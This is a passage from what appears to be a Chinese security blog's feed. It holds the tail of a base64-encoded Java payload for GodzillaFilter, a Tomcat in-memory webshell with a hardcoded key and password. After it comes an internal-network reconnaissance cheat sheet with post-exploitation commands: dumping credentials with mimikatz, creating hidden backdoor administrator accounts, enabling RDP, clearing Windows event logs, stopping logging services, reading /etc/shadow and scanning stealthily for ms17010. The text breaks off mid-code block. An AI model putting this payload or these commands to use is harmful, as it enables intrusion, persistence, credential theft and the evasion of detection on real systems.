XF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwGjBwGkBwGlBwFhBwFiBwGmBwGnAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABNHb2R6aWxsYUZpbHRlci5qYXZhDACUAJUMAIoAiwwAjACNAQAQM2M2ZTBiOGE5YzE1MjI0YQwAjgCPAQAIcGFzczEwMjQMAJAAjwEAEC9mYXZpY29uZGVtby5pY28MAJEAjwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAGoAakMAaoA1QwAkgCvDACSAI8BAAVVVEYtOAwAkwCPDACUAJsMAasBrAEAA0FFUwcBmwwBrQGuAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBrwGwDACUAbEMAP0BsgwBswG0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAA01ENQcBtQwBrQG2DAG3AbgMAbkBugEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAG7AbAMAJQBvAwBqgG9DAG%2BANUBABBqYXZhLnV0aWwuQmFzZTY0DAG%2FAcABAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAHBAcIHAaAMAcMBxAwBxQHGAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAccByAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDADKAMsBAAFwDAHJAK8BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQADLT58AQADfDwtAQAJdGV4dC9odG1sDAHKAcsMAcwBywwA1ADVDAGoAc0BAAZlcnJvcjoMAc4BzwcB0AwB0QHLDAHSAJUMAdMAlQwB1AHVAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQBAApnZXRSZXF1ZXN0DAHWAcIBAAtnZXRSZXNwb25zZQwB1wHYBwGfDAHZAdoMAdsB3AwB3QHeBwGeDAHfAeABAAdjb250ZXh0AQArb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uQ29udGV4dAEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQBACZvcmcvYXBhY2hlL2NhdGFsaW5hL3V0aWwvTGlmZWN5Y2xlQmFzZQEABXN0YXRlBwHhDAHiAeMMAeQB5QwA1AHmBwHnDAHoAekHAeoMAesB7AwB7QHuAQALZmlsdGVyU3RhcnQMAe8B4wEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyTWFwAQAkb3JnLmFwYWNoZS5jYXRhbGluYS5kZXBsb3kuRmlsdGVyTWFwAQANZ2V0RmlsdGVyTmFtZQwB8AHxAQAHU3VjY2VzcwwB8gDVAQAVRmlsdGVyIGFscmVhZHkgZXhpc3RzDAHzAfQHAaMMAfUArwwAvQC%2BDACiAKMBAAdwYXlsb2FkBwGmDAH2AfcBAB5jb20vc3VtbWVyc2VjL3gvR29kemlsbGFGaWx0ZXIMAfgB%2BQwAngCfDAH6AfsBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAMAAwQwB%2FAH9DAH%2BAcsMAf8BsAwAswC0DAH8Ab0BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIHAgABAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9sYW5nL1Rocm93YWJsZQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAlnZXRIZWFkZXIBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEABWZsdXNoAQAFY2xvc2UBAAdpc0FycmF5AQADKClaAQARZ2V0RGVjbGFyZWRNZXRob2QBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRDb250ZXh0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDsBABVnZXRGaWx0ZXJSZWdpc3RyYXRpb24BADYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbjsBACJvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlAQANU1RBUlRJTkdfUFJFUAEAJExvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAVChMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9GaWx0ZXI7KUxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUBAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7AQARamF2YS91dGlsL0VudW1TZXQBAAJvZgEAJShMamF2YS9sYW5nL0VudW07KUxqYXZhL3V0aWwvRW51bVNldDsBABhhZGRNYXBwaW5nRm9yVXJsUGF0dGVybnMBACooTGphdmEvdXRpbC9FbnVtU2V0O1pbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdTVEFSVEVEAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEACmdldE1lc3NhZ2UBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQALdG9CeXRlQXJyYXkBACBqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbgAhAHgAiAABAIkABwABAIoAiwAAAAEAjACNAAAAAACOAI8AAAABAJAAjwAAAAEAkQCPAAAAAACSAI8AAAABAJMAjwAAAA0AAQCUAJUAAQCWAAAAkAADAAEAAABGKrcAASoBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAIAlwAAACYACQAAACcABAAfAAkAIAAOACEAFAAiABoAIwAgACgAPwApAEUAKgCYAAAADAABAAAARgCZAJoAAAABAJQAmwABAJYAAACbAAMAAgAAAEcqK7cAEioBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAIAlwAAACYACQAAAC0ABQAfAAoAIAAPACEAFQAiABsAIwAhAC4AQAAvAEYAMACYAAAAFgACAAAARwCZAJoAAAAAAEcAnACdAAEAAQCeAJ8AAQCWAAAAPQAEAAIAAAAJKisDK763ABOwAAAAAgCXAAAABgABAAAAMwCYAAAAFgACAAAACQCZAJoAAAAAAAkAoAChAAEAAQCiAKMAAQCWAAAA2AAGAAQAAAAsEhS4ABVOLRyZAAcEpwAEBbsAFlkqtAAFtgAXEhS3ABi2ABktK7YAGrBOAbAAAQAAACgAKQAbAAMAlwAAABYABQAAADgABgA5ACMAOgApADsAKgA8AJgAAAA0AAUABgAjAKQApQADACoAAgCmAKcAAwAAACwAmQCaAAAAAAAsAKgAoQABAAAALACpAKoAAgCrAAAAPAAD%2FwAPAAQHAKwHAC8BBwCtAAEHAK3%2FAAAABAcArAcALwEHAK0AAgcArQH%2FABgAAwcArAcALwEAAQcArgAJAJIArwABAJYAAACnAAQAAwAAADABTBIcuAAdTSwqtgAXAyq2AB62AB%2B7ACBZBCy2ACG3ACIQELYAI7YAJEynAARNK7AAAQACACoALQAbAAMAlwAAAB4ABwAAAEEAAgBEAAgARQAVAEYAKgBIAC0ARwAuAEoAmAAAACAAAwAIACIAqQCwAAIAAAAwAKgAjwAAAAIALgCxAI8AAQCrAAAAEwAC%2FwAtAAIHALIHALIAAQcArgAACQCzALQAAgCWAAABSQAGAAUAAAB4AUwSJbgAJk0sEicBwAAotgApLAHAACq2ACtOLbYALBItBL0ALlkDEi9TtgApLQS9ADBZAypTtgArwAAxTKcAOU4SMrgAJk0stgAzOgQZBLYALBI0BL0ALlkDEi9TtgApGQQEvQAwWQMqU7YAK8AAMUynAAU6BCuwAAIAAgA9AEAAGwBBAHEAdAAbAAMAlwAAADIADAAAAE4AAgBSAAgAUwAbAFQAPQBcAEAAVQBBAFcARwBYAE0AWQBxAFsAdABaAHYAXgCYAAAASAAHABsAIgC1ALYAAwAIADgAtwC4AAIATQAkALUAtgAEAEcALQC3ALgAAgBBADUAuQCnAAMAAAB4ALoAoQAAAAIAdgC7AI8AAQCrAAAAKQAD%2FwBAAAIHAC8HALIAAQcArv8AMwAEBwAvBwCyAAcArgABBwCu%2BQABALwAAAAEAAEAGwAJAL0AvgACAJYAAAFVAAYABQAAAIQBTBIluAAmTSwSNQHAACi2ACksAcAAKrYAK04ttgAsEjYEvQAuWQMSMVO2ACktBL0AMFkDKlO2ACvAAC%2FAAC%2FAAC9MpwA%2FThI3uAAmTSy2ADM6BBkEtgAsEjgEvQAuWQMSMVO2ACkZBAS9ADBZAypTtgArwAAvwAAvwAAvTKcABToEK7AAAgACAEMARgAbAEcAfQCAABsAAwCXAAAAMgAMAAAAYgACAGYACABnABsAaABDAHAARgBpAEcAawBNAGwAUwBtAH0AbwCAAG4AggByAJgAAABIAAcAGwAoAL8AtgADAAgAPgC3ALgAAgBTACoAvwC2AAQATQAzALcAuAACAEcAOwC5AKcAAwAAAIQAugCPAAAAAgCCALsAoQABAKsAAAApAAP%2FAEYAAgcAsgcALwABBwCu%2FwA5AAQHALIHAC8ABwCuAAEHAK75AAEAvAAAAAQAAQAbAAEAwADBAAEAlgAAAaMAAwAGAAAAxiortgA5Kiq0AAISOrkAOwIAtQAHKiq0AAISPLkAOwIAtQAJuwA9WbcAPk0SP04SQDoEKrQAAxJBuQBCAgAqtAACKrQAEbkAQwIAKrQAAyq0ABG5AEQCACwqtgBFtgBGV6cAIToFLLsAClm3AAsSR7YADBkFtgBItgAMtgANtgBGVyq0AAO5AEkBALsAClm3AAsttgAMLLYASrYADBkEtgAMtgANtgBLKrQAA7kASQEAtgBMKrQAA7kASQEAtgBNpwAFOgUErAACADIAYABjABsAgQC%2FAMIAGwADAJcAAABOABMAAAB2AAUAdwAUAHgAIwB5ACsAegAuAHsAMgB%2BAD0AfwBKAIAAVwCBAGAAhABjAIIAZQCDAIEAhwCnAIgAswCJAL8AiwDCAIoAxACNAJgAAAA%2BAAYAZQAcAMIApwAFAAAAxgCZAJoAAAAAAMYAwwC2AAEAKwCbAMQAxQACAC4AmADGAI8AAwAyAJQAxwCPAAQAqwAAACMABP8AYwAFBwCsBwDIBwDJBwCyBwCyAAEHAK4d9wBABwCuAQABAMoAywABAJYAAAIGAAQABgAAAN8rtgAstgBOmQAlK8AAKsAAKsAAKk0qLAMywABPtQACKiwEMsAAULUAA6cAtRJRuAAmTSosElIDvQAutgBTKwO9ADC2ACvAAE%2B1AAIqLBJUA70ALrYAUysDvQAwtgArwABQtQADpwB6TSvBAE%2BZAHIqK8AAT7UAAiq0AAK2ACwSVbYAVk4tBLYAVy0qtAACtgBYwABPOgQZBLYALBJZtgBWOgUZBQS2AFcqGQUZBLYAWMAAULUAA6cAKE4qKrQAArYALBJUA70ALrYAUysDvQAwtgArwABQtQADpwAFOgSxAAMALABkAGcAGwB3ALYAuQAbALoA2QDcABsAAwCXAAAAYgAYAAAAkQAKAJIAFQCTAB8AlAApAJUALACXADIAmABLAJkAZACsAGcAmgBoAJsAbwCcAHcAnwCEAKAAiQChAJYAogCiAKMAqACkALYAqgC5AKUAugCnANkAqQDcAKgA3gCvAJgAAABcAAkAFQAUAMwAzQACADIAMgDOALgAAgCEADIAzwDQAAMAlgAgANEAiwAEAKIAFADSANAABQC6ACQAwgCnAAMAaAB2ANMApwACAAAA3wCZAJoAAAAAAN8AwwC2AAEAqwAAADMABSx6BwCu%2FwBRAAMHAKwHAMgHAK4AAQcArv8AIgAEBwCsBwDIBwCuBwCuAAEHAK75AAEAAQDUANUAAgCWAAAEKgAHABMAAAGWKrQAArkAWgEATCpNKrQACU4qtAAJOgQrLbkAWwIAxwF1AToFAToGAToHAToIAToJK7YALBJctgBWOgUZBQS2AFcZBSu2AFjAAF06BhkGtgAsEly2AFY6BRkFBLYAVxkFGQa2AFjAAF46BxJfEmC2AFY6CBkIBLYAVxkIGQeyAGG2AGIrLSy5AGMDADoJGQmyAGS4AGUDBL0AMVkDGQRTuQBmBAASXhJnA70ALrYAKToLGQsEtgBoGQsZBwHAACq2ACtXGQgZB7IAabYAYgE6ChJquAAmOgynAAw6DRJruAAmOgwZB7YALBJsA70ALrYAKToNGQ0ZBwO9ADC2ACvAACrAACrAACo6DgM2DxUPGQ6%2BogBFGQ4VDzI6EBkMEm0DvQAutgApOg0ZDRkQA70AMLYAK8AAMToRGREttgBumQASGQ4VDxkOAzJTGQ4DGRBThA8Bp%2F%2B5Em86DxkPOhAZCBkHsgBptgBiGRCwOgsZC7YAcDoKGQgZB7IAabYAYqcAEjoSGQgZB7IAabYAYhkSvxkKsBJxsAAFANAA1wDaABsAMAFeAWsAGwAwAV4BgQAAAWsBdAGBAAABgQGDAYEAAAADAJcAAADOADMAAACyAAoAswAMALQAEQC1ABcAtgAhALcAJAC4ACcAuQAqALoALQC7ADAAvwA7AMAAQQDBAEwAwgBYAMMAXgDEAGoAxQBzAMYAeQDHAIMAyACNAMkApADKALEAywC3AMwAwwDNAM0AzgDQANIA1wDVANoA0wDcANQA4wDXAPMA2AEJANoBFADbARsA3AEoAN0BOADeAUEA3wFKAOABUADaAVYA5AFaAOUBXgDpAWgA5QFrAOYBbQDnAXQA6QF%2BAOoBgQDpAZAA7AGTAO4AmAAAAPIAGADXAAMA1gC4AAwA3AAHANcApwANARsANQDYALYAEAE4ABgA2QCPABEBDABKANoA2wAPALEAugDcAN0ACwDjAIgA1gC4AAwA8wB4AN4A3QANAQkAYgDfAM0ADgFaABEA4ACPAA8A0ACbAOEAjwAKAW0ABwDiAKcACwF0AA0A4QCPAAoAJAFvAOMA0AAFACcBbADkAOUABgAqAWkA5gDnAAcALQFmAOgA0AAIADABYwDpAO0ACQGQAAMA4QCPAAoAAAGWAJkAmgAAAAoBjADuAO8AAQAMAYoA8ADxAAIAEQGFAPIAjwADABcBfwDzAI8ABACrAAAAjgAJ%2FwDaAAwHAKwHAPQHAPUHALIHALIHAPYHAPcHAPgHAPYHAPkHALIHAPoAAQcArvwACAcA%2B%2F4AKAcA%2BgcAKgH7AEP6AAX%2FABQACgcArAcA9AcA9QcAsgcAsgcA9gcA9wcA%2BAcA9gcA%2BQABBwCuVQcA%2FPwADgcAsv8AAgAFBwCsBwD0BwD1BwCyBwCyAAAAvAAAAAQAAQAbAAEA%2FQD%2BAAIAlgAAADUAAAACAAAAAbEAAAACAJcAAAAGAAEAAADzAJgAAAAWAAIAAAABAJkAmgAAAAAAAQD%2FAQAAAQC8AAAABAABAQEAAQECAQMAAgCWAAAB6gAFAAoAAADXK8AATzoELMAAUDoFGQS5AHIBADoGKyq0AAe5AHMCALgAdDoHKhkHA7YAdToHGQYSdrkAdwIAxwAiGQYSdrsAeFkqtgAstgB5twB6GQe2AHu5AHwDAKcAfBkEEn0ZB7kAfgMAuwB%2FWbcAgDoIGQYSdrkAdwIAwAAutgAzOgkZCRkItgCBVxkJGQe2AIFXGQW5AEkBACq0AA8DEBC2AIK2AIMZCbYAhFcZBbkASQEAKhkItgCFBLYAdbgAhrYAgxkFuQBJAQAqtAAPEBC2AIe2AIOnAAU6BLEAAQAAANEA1AAbAAMAlwAAAE4AEwAAAPcABgD4AAwA%2BQAVAPoAJAD7AC0A%2FAA5AP0AWAD%2FAGMBAABsAQEAfQECAIUBAwCNAQQAoQEFAKcBBgC%2BAQcA0QEKANQBCQDWAQwAmAAAAGYACgBsAGUBBAEFAAgAfQBUAQYAtgAJAAYAywCKAIsABAAMAMUAjACNAAUAFQC8AQcBCAAGACQArQDMAKEABwAAANcAmQCaAAAAAADXAM8BCQABAAAA1wDSAQoAAgAAANcBCwEMAAMAqwAAADkABP8AWAAIBwCsBwENBwEOBwEPBwEQBwERBwESBwAvAAD%2FAHgABAcArAcBDQcBDgcBDwAAQgcArgEAvAAAAAYAAgETAQEAAQEUAJUAAQCWAAAAKwAAAAEAAAABsQAAAAIAlwAAAAYAAQAAAQ8AmAAAAAwAAQAAAAEAmQCaAAAAAgEVAAAAAgEWAOwAAAAKAAEA6gGcAOsGCQ%3D%3D</code></pre>]]></content>
    
    
    <categories>
      
      <category>组件漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>组件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2024/11/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2024/11/11/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="WIN"><a href="#WIN" class="headerlink" title="WIN"></a>WIN</h1><h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><h3 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h3><p>ipconfig &#x2F;all</p><h3 id="主机路由信息"><a href="#主机路由信息" class="headerlink" title="主机路由信息"></a>主机路由信息</h3><p>route print</p><h3 id="ARP缓存"><a href="#ARP缓存" class="headerlink" title="ARP缓存"></a>ARP缓存</h3><p>arp -a<br>看局域网内有哪些ip地址</p><h3 id="DNS缓存信息"><a href="#DNS缓存信息" class="headerlink" title="DNS缓存信息"></a>DNS缓存信息</h3><p>ipconfig &#x2F;displaydns</p><h3 id="Hosts文件信息"><a href="#Hosts文件信息" class="headerlink" title="Hosts文件信息"></a>Hosts文件信息</h3><p><code>type C:\Windows\System32\drivers\etc\hosts</code></p><h3 id="端口连接信息"><a href="#端口连接信息" class="headerlink" title="端口连接信息"></a>端口连接信息</h3><p>netstat -ano</p><h3 id="进程相关信息"><a href="#进程相关信息" class="headerlink" title="进程相关信息"></a>进程相关信息</h3><p>tasklist &#x2F;svc</p><h3 id="AV防护信息"><a href="#AV防护信息" class="headerlink" title="AV防护信息"></a>AV防护信息</h3><p><code>wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName,productState,pathToSignedProductExe | findstr /V /B /C:displayName || echo No Antivirus installed</code></p><h2 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h2><h3 id="web信息"><a href="#web信息" class="headerlink" title="web信息"></a>web信息</h3><p>netstat -ano</p><h3 id="文档信息"><a href="#文档信息" class="headerlink" title="文档信息"></a>文档信息</h3><p><code>dir /a /s /b C:\*.xls</code><br><code>dir /a /s /b C:\*.doc</code><br><code>dir /s /s /b C:\*.txt</code><br>换不同盘符，不同后缀去看敏感信息</p><h3 id="微信信息"><a href="#微信信息" class="headerlink" title="微信信息"></a>微信信息</h3><p><code>dir /s /b C:\&quot;WeChat Files&quot;</code></p><h2 id="网络资产"><a href="#网络资产" class="headerlink" title="网络资产"></a>网络资产</h2><p>fscan kscan<br>尽量安静，不易被发现，使用正常协议，改造过的工具<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -m -netbios<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -m -ms17010<br>xxx.exe -i 192.168.0.0&#x2F;24 -np -p 22,2222,3389,5900,1433,3066,1521,5432,6379<br>-np -nobr -nopoc -o res.txt</p><h2 id="密码凭证"><a href="#密码凭证" class="headerlink" title="密码凭证"></a>密码凭证</h2><h3 id="主机密码"><a href="#主机密码" class="headerlink" title="主机密码"></a>主机密码</h3><p>logonpasswords<br>hashdump<br>mimikatz’s sekurlsa::logonpasswords</p><h3 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h3><p>BrowserGhost<br>HackBrowserData</p><h3 id="文档密码"><a href="#文档密码" class="headerlink" title="文档密码"></a>文档密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /a /s /b c:\*.xls<br><span class="hljs-built_in">dir</span> /a /s /b c:\*.doc<br><span class="hljs-built_in">dir</span> /a /s /b d:\*.xls<br><span class="hljs-built_in">dir</span> /a /s /b d:\*.doc<br></code></pre></td></tr></table></figure><h2 id="用户操作相关"><a href="#用户操作相关" class="headerlink" title="用户操作相关"></a>用户操作相关</h2><p>whoami<br>query user<br>激活guest<br>net user guest &#x2F;active:yes<br>net user guest P@ssw0rd123<br>net localgroup administrators guest &#x2F;add<br>net localgroup administrators<br>激活administrator<br>net user Administrator &#x2F;active:yes<br>net user Administrator P@ssw0rd123<br>创建后门用户<br>net user test$ P@ssw0rd123 &#x2F;add<br>net localgroup administrators test$ &#x2F;add<br>net localgroup administrators</p><h2 id="RDP操作相关"><a href="#RDP操作相关" class="headerlink" title="RDP操作相关"></a>RDP操作相关</h2><p>查看开放端口<br>reg query “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” &#x2F;v PortNumber<br>开放RDP服务<br>reg add “HKLM\SYSTEM\CurrentControlSet\control\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;d 0 &#x2F;t REG_DWORD &#x2F;f<br>开放RDP端口<br>netsh advfirewall firewall add rule name&#x3D;”Remote Desktop” protocol&#x3D;TCP dir&#x3D;<br>in localport&#x3D;3389 action&#x3D;allow</p><h2 id="日志痕迹相关"><a href="#日志痕迹相关" class="headerlink" title="日志痕迹相关"></a>日志痕迹相关</h2><p>wevtutil cl “windows powershell”<br>wevtutil cl “security”<br>wevtutil cl “system”<br>wevtutil cl “Application”</p><p>sc stop Schedule<br>sc stop wecsvc<br>sc stop eventlog</p><h1 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h1><h2 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h2><p>whoami ⽤户信息<br>uname -a 打印所有可⽤的系统信息<br>uname -r 内核版本<br>uname -n 系统主机名。<br>uname -m 查看系统内核架构（64位&#x2F;32位）<br>hostname 系统主机名<br>lsb_release -a 发⾏版信息<br>cat &#x2F;proc&#x2F;version 内核信息</p><p>cat &#x2F;etc&#x2F;passwd<br>cat &#x2F;etc&#x2F;shadow<br>cat &#x2F;etc&#x2F;group</p><p>lastlog<br>last</p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>ip addr s<br>ifconfig<br>netstat -anptl</p><h2 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h2><p>ps -ef</p><h2 id="计划任务信息"><a href="#计划任务信息" class="headerlink" title="计划任务信息"></a>计划任务信息</h2><p>crontab -l<br>ls &#x2F;etc&#x2F;cron*</p><h2 id="操作记录信息"><a href="#操作记录信息" class="headerlink" title="操作记录信息"></a>操作记录信息</h2><p>history<br>cat &#x2F;root&#x2F;.bash_history</p><h2 id="web信息-1"><a href="#web信息-1" class="headerlink" title="web信息"></a>web信息</h2><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td 